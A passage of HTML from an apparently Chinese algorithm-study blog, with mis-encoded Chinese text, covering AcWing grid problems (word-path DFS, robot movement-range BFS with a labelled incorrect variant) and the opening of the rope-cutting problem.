xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><msup><mi>n</mi><mn>2</mn></msup><msup><mn>3</mn><mi>k</mi></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n^23^k)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0991em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mord"><span class="mord">3</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></h3><p><strong>ç»å…¸çš„DFS</strong></p><blockquote><p>è‡ªå·±å¤šç»ƒç»ƒï¼Œè¿™ä¹ˆç®€å•çš„é¢˜ç›®ä¸€å®šè¦å†™å¯¹å•¦ï¼</p></blockquote><p><strong>æ—¶é—´å¤æ‚åº¦åˆ†æ</strong></p><p>å•è¯èµ·ç‚¹ä¸€å…±æœ‰ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>n</mi><mn>2</mn></msup></mrow><annotation encoding="application/x-tex">n^2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span> ä¸ªï¼Œå•è¯çš„æ¯ä¸ªå­—æ¯ä¸€å…±æœ‰ä¸Šä¸‹å·¦å³å››ä¸ªæ–¹å‘å¯ä»¥é€‰æ‹©ï¼Œä½†ç”±äºä¸èƒ½èµ°å›å¤´è·¯ï¼Œæ‰€ä»¥é™¤äº†å•è¯é¦–å­—æ¯å¤–ï¼Œä»…æœ‰ä¸‰ç§é€‰æ‹©ã€‚æ‰€ä»¥æ€»æ—¶é—´å¤æ‚åº¦æ˜¯ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><msup><mi>n</mi><mn>2</mn></msup><msup><mn>3</mn><mi>k</mi></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n^23^k)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0991em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mord"><span class="mord">3</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  vector&lt;vector&lt;<span class="type">char</span>&gt;&gt; mat;</span><br><span class="line">  string str;</span><br><span class="line">  <span class="type">int</span> dx[<span class="number">4</span>] = &#123;<span class="number">-1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>&#125;, dy[<span class="number">4</span>] = &#123;<span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">-1</span>&#125;;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="type">bool</span> <span class="title">hasPath</span><span class="params">(vector&lt;vector&lt;<span class="type">char</span>&gt;&gt; &amp;_matrix, string &amp;_str)</span> </span>&#123;</span><br><span class="line">    mat = _matrix, str = _str;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; mat.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; mat[<span class="number">0</span>].<span class="built_in">size</span>(); j++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">dfs</span>(i, j, <span class="number">0</span>)) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="type">bool</span> <span class="title">dfs</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y, <span class="type">int</span> d)</span> </span>&#123;  <span class="comment">// å½¢å‚ä¸è¦ç”¨i,j, å› ä¸ºå¾ªç¯å¸¸ç”¨</span></span><br><span class="line">    <span class="keyword">if</span> (mat[x][y] != str[d]) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span> (d == str.<span class="built_in">size</span>() - <span class="number">1</span>) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="type">char</span> t = mat[x][y];  <span class="comment">// å°†åŒ¹é…è¿‡çš„å­—ç¬¦æ”¹ä¸ºç‰¹æ®Šå­—ç¬¦, é˜²æ­¢é‡å¤åŒ¹é…</span></span><br><span class="line">    mat[x][y] = <span class="string">&#x27;@&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">      <span class="type">int</span> a = x + dx[i], b = y + dy[i];</span><br><span class="line">      <span class="keyword">if</span> (a &gt;= <span class="number">0</span> &amp;&amp; a &lt; mat.<span class="built_in">size</span>() &amp;&amp; b &gt;= <span class="number">0</span> &amp;&amp; b &lt; mat[<span class="number">0</span>].<span class="built_in">size</span>()) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">dfs</span>(a, b, d + <span class="number">1</span>)) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    mat[x][y] = t;  <span class="comment">// u+1åœ¨3ä¸ªæ–¹å‘(4ä¸ªé™¤å»æ¥æ—¶ä½ç½®)éƒ½æ— æ³•åŒ¹é…, uå¤„å¾€åæ— æ³•åŒ¹é…, æ”¾å¼ƒæ—¶éœ€è¦å›æº¯</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h1 id="Week-2">Week 2</h1><h2 id="æœºå™¨äººçš„è¿åŠ¨èŒƒå›´â˜…"><a href="https://www.acwing.com/problem/content/22/">æœºå™¨äººçš„è¿åŠ¨èŒƒå›´â˜…</a></h2><p>åœ°ä¸Šæœ‰ä¸€ä¸ª <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span> è¡Œå’Œ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> åˆ—çš„æ–¹æ ¼ï¼Œæ¨ªçºµåæ ‡èŒƒå›´åˆ†åˆ«æ˜¯ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn><mo>âˆ¼</mo><mi>m</mi><mo>âˆ’</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">0 \sim m - 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">âˆ¼</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span> å’Œ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn><mo>âˆ¼</mo><mi>n</mi><mo>âˆ’</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">0 \sim n - 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">âˆ¼</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span>ã€‚</p><p>ä¸€ä¸ªæœºå™¨äººä»åæ ‡ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mn>0</mn><mo separator="true">,</mo><mn>0</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(0,0)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">0</span><span class="mclose">)</span></span></span></span> çš„æ ¼å­å¼€å§‹ç§»åŠ¨ï¼Œæ¯ä¸€æ¬¡åªèƒ½å‘å·¦ï¼Œå³ï¼Œä¸Šï¼Œä¸‹å››ä¸ªæ–¹å‘ç§»åŠ¨ä¸€æ ¼ã€‚</p><p>ä½†æ˜¯ä¸èƒ½è¿›å…¥è¡Œåæ ‡å’Œåˆ—åæ ‡çš„æ•°ä½ä¹‹å’Œå¤§äº <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span> çš„æ ¼å­ã€‚</p><p>è¯·é—®è¯¥æœºå™¨äººèƒ½å¤Ÿè¾¾åˆ°å¤šå°‘ä¸ªæ ¼å­ï¼Ÿ</p><p><strong>æ³¨æ„</strong>:</p><ol><li><code>0&lt;=m&lt;=50</code></li><li><code>0&lt;=n&lt;=50</code></li><li><code>0&lt;=k&lt;=100</code></li></ol><p><strong>æ ·ä¾‹1</strong></p><pre><code>è¾“å…¥ï¼šk=7, m=4, n=5è¾“å‡ºï¼š20</code></pre><p><strong>æ ·ä¾‹2</strong></p><pre><code>è¾“å…¥ï¼šk=18, m=40, n=40è¾“å‡ºï¼š1484è§£é‡Šï¼šå½“kä¸º18æ—¶ï¼Œæœºå™¨äººèƒ½å¤Ÿè¿›å…¥æ–¹æ ¼ï¼ˆ35,37ï¼‰ï¼Œå› ä¸º3+5+3+7 = 18ã€‚      ä½†æ˜¯ï¼Œå®ƒä¸èƒ½è¿›å…¥æ–¹æ ¼ï¼ˆ35,38ï¼‰ï¼Œå› ä¸º3+5+3+8 = 19ã€‚</code></pre><h3 id="BFSå¤§æ³•å¥½-O-nm">BFSå¤§æ³•å¥½ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mi>m</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(nm)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">nm</span><span class="mclose">)</span></span></span></span></h3><p>æ³¨æ„é¢˜ç›®è¦æ±‚â€œæ¯ä¸€æ¬¡åªèƒ½å‘å·¦ï¼Œå³ï¼Œä¸Šï¼Œä¸‹å››ä¸ªæ–¹å‘ç§»åŠ¨ä¸€æ ¼â€ï¼Œæ‰€ä»¥ä½¿dfsæˆ–è€…bfså°±èƒ½ä¸é‡ä¸æ¼çš„æ±‚å¾—ç»“æœï¼Œã€‚</p><blockquote><p>ä¸€å®šè¦èƒ½ç†Ÿç»ƒå†™å¯¹å‘€ã€‚</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="type">int</span> <span class="title">get_sum</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (x) &#123;</span><br><span class="line">      sum += x % <span class="number">10</span>;</span><br><span class="line">      x /= <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (y) &#123;</span><br><span class="line">      sum += y % <span class="number">10</span>;</span><br><span class="line">      y /= <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="type">int</span> <span class="title">movingCount</span><span class="params">(<span class="type">int</span> threshold, <span class="type">int</span> rows, <span class="type">int</span> cols)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!rows || !cols) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line">    vector&lt;vector&lt;<span class="type">bool</span>&gt;&gt; <span class="built_in">st</span>(rows, <span class="built_in">vector</span>&lt;<span class="type">bool</span>&gt;(cols, <span class="literal">false</span>));</span><br><span class="line">    queue&lt;pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt;&gt; q;</span><br><span class="line">    q.<span class="built_in">push</span>(&#123;<span class="number">0</span>, <span class="number">0</span>&#125;);</span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> dx[<span class="number">4</span>] = &#123;<span class="number">-1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>&#125;, dy[<span class="number">4</span>] = &#123;<span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">-1</span>&#125;;</span><br><span class="line">    <span class="keyword">while</span> (q.<span class="built_in">size</span>()) &#123;</span><br><span class="line">      <span class="keyword">auto</span> t = q.<span class="built_in">front</span>();</span><br><span class="line">      q.<span class="built_in">pop</span>();</span><br><span class="line">      </span><br><span class="line">      <span class="type">int</span> x = t.first, y = t.second;</span><br><span class="line">      <span class="keyword">if</span> (st[x][y] || <span class="built_in">get_sum</span>(x, y) &gt; threshold) <span class="keyword">continue</span>;</span><br><span class="line">      st[x][y] = <span class="literal">true</span>;</span><br><span class="line">      res++;</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">        <span class="type">int</span> a = x + dx[i], b = y + dy[i];</span><br><span class="line">        <span class="keyword">if</span> (a &gt;= <span class="number">0</span> &amp;&amp; a &lt; rows &amp;&amp; b &gt;= <span class="number">0</span> &amp;&amp; b &lt; cols &amp;&amp; !st[a][b]) &#123;</span><br><span class="line">          q.<span class="built_in">push</span>(&#123;a, b&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>é”™è¯¯å†™æ³•</strong></p><p>â€œåˆ¤æ–­æ˜¯å¦èµ°è¿‡â€ä¸€å®šè¦æ”¾åˆ°<code>res++</code>å‰ï¼Œä¸‹é¢è¿™æ ·å†™ä¼šå¯¼è‡´ç®—ç»“æœåå¤šï¼š</p><table><thead><tr><th style="text-align:center">3</th><th style="text-align:center">4</th></tr></thead><tbody><tr><td style="text-align:center">1</td><td style="text-align:center">2</td></tr></tbody></table><p>1å·å‡ºé˜Ÿåˆ—åä¼šå°†2å’Œ3å…¥é˜Ÿï¼Œ3å‡ºé˜Ÿåˆ—æ—¶ä¼šå°†4å…¥é˜Ÿï¼Œæ­¤æ—¶2æ¯”4æ›´é è¿‘å¯¹å¤´ï¼Œæ‰€ä»¥2å‡ºå¯¹æ—¶ä¼šå°†4é‡å¤å…¥é˜Ÿã€‚<br>è™½ç„¶åœ¨å…¥é˜Ÿåï¼Œé©¬ä¸Šæ ‡è®°<code>st[a][b] = true</code>å°±èƒ½è§£å†³é—®é¢˜ï¼Œä½†æ˜¯è¿˜æ˜¯æ›´æ¨èä¸Šé¢çš„æ€è·¯å’Œå†™æ³•ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">movingCount</span><span class="params">(<span class="type">int</span> threshold, <span class="type">int</span> rows, <span class="type">int</span> cols)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!rows || !cols) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">  <span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line">  vector&lt;vector&lt;<span class="type">bool</span>&gt;&gt; <span class="built_in">st</span>(rows, <span class="built_in">vector</span>&lt;<span class="type">bool</span>&gt;(cols, <span class="literal">false</span>));</span><br><span class="line">  queue&lt;pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt;&gt; q;</span><br><span class="line">  q.<span class="built_in">push</span>(&#123;<span class="number">0</span>, <span class="number">0</span>&#125;);</span><br><span class="line">    </span><br><span class="line">  <span class="type">int</span> dx[<span class="number">4</span>] = &#123;<span class="number">-1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>&#125;, dy[<span class="number">4</span>] = &#123;<span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">-1</span>&#125;;</span><br><span class="line">  <span class="keyword">while</span> (q.<span class="built_in">size</span>()) &#123;</span><br><span class="line">    <span class="keyword">auto</span> t = q.<span class="built_in">front</span>();</span><br><span class="line">    q.<span class="built_in">pop</span>();</span><br><span class="line">    <span class="type">int</span> x = t.first, y = t.second;</span><br><span class="line">    st[x][y] = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">get_sum</span>(x, y) &gt; threshold) <span class="keyword">continue</span>;</span><br><span class="line">    res++;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">      <span class="type">int</span> a = x + dx[i], b = y + dy[i];</span><br><span class="line">      <span class="keyword">if</span> (a &gt;= <span class="number">0</span> &amp;&amp; a &lt; rows &amp;&amp; b &gt;= <span class="number">0</span> &amp;&amp; b &lt; cols &amp;&amp; !st[a][b]) &#123;</span><br><span class="line">        q.<span class="built_in">push</span>(&#123;a, b&#125;);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> res;</span><br></pre></td></tr></table></figure><h2 id="å‰ªç»³å­"><a href="https://www.acwing.com/problem/content/24/">å‰ªç»³å­</a></h2><p>ç»™ä½ ä¸€æ ¹é•¿åº¦ä¸º <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> ç»³å­ï¼Œè¯·æŠŠç»³å­å‰ªæˆ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span> æ®µï¼ˆ<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span>ã€<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> éƒ½æ˜¯æ•´æ•°ï¼Œ<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>2</mn><mo>â‰¤</mo><mi>n</mi><mo>â‰¤</mo><mn>58</mn></mrow><annotation encoding="application/x-tex">2 \le n \le 58</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">2</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">58</span></span></span></span> å¹¶ä¸” <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mo>â‰¥</mo><mn>2</mn></mrow><annotation encoding="application/x-tex">m \ge 2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¥</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">2</span></span></span></span>ï¼‰ã€‚</p><p>æ¯æ®µçš„ç»³å­çš„é•¿åº¦è®°ä¸º <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi><mo stretchy="false">[</mo><mn>1</mn><mo stretchy="false">]</mo><mtext>ã€</mtext><mi>k</mi><mo stretchy="false">[</mo><mn>2</mn><mo stretchy="false">]</mo><mtext>ã€</mtext><mo>â€¦</mo><mo>â€¦</mo><mtext>ã€</mtext><mi>k</mi><mo stretchy="false">[</mo><mi>m</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">k[1]ã€k[2]ã€â€¦â€¦ã€k[m]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mopen">[</span><span class="mord">1</span><span class="mclose">]</span><span class="mord cjk_fallback">ã€</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mopen">[</span><span class="mord">2</span><span class="mclose">]</span><span class="mord cjk_fallback">ã€</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">â€¦â€¦</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord cjk_fallback">ã€</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mopen">[</span><span class="mord mathnormal">m</span><span class="mclose">]</span></span></span></span>ã€‚</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi><mo stretchy="false">[</mo><mn>1</mn><mo stretchy="false">]</mo><mi>k</mi><mo stretchy="false">[</mo><mn>2</mn><mo stretchy="false">]</mo><mo>â€¦</mo><mi>k</mi><mo stretchy="false">[</mo><mi>m</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">k[1]k[2] â€¦ k[m]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mopen">[</span><span class="mord">1</span><span class="mclose">]</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mopen">[</span><span class="mord">2</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">â€¦</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mopen">[</span><span class="mord mathnormal">m</span><span class="mclose">]</span></span></span></span> å¯èƒ½çš„æœ€å¤§ä¹˜ç§¯æ˜¯å¤šå°‘ï¼Ÿ</p><p>ä¾‹å¦‚å½“ç»³å­çš„é•¿åº¦æ˜¯ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>8</mn></mrow><annotation encoding="application/x-tex">8</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">8</span></span></span></span> æ—¶ï¼Œæˆ‘ä»¬æŠŠå®ƒå‰ªæˆé•¿åº¦åˆ†åˆ«ä¸º <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>2</mn><mtext>ã€</mtext><mn>3</mn><mtext>ã€</mtext><mn>3</mn></mrow><annotation encoding="application/x-tex">2ã€3ã€3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span 